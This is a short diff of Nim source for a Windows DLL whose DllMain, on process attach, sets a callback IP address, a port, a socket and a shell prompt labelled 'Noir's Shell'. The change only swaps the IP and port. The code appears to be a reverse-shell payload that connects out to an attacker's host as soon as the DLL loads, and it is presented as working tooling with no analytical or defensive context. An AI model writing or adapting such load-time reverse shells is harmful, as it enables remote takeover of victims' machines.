@@ -9,8 +9,8 @@ proc DllMain(hinstDll: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {
     if fdwReason == DLL_PROCESS_ATTACH:
         # Variables
         let
-            ip = "192.168.1.26"
-            port = 8080
+            ip = "192.168.131.128"
+            port = 2583
             sock = newSocket()
             prompt = "Noir's Shell $ "
 
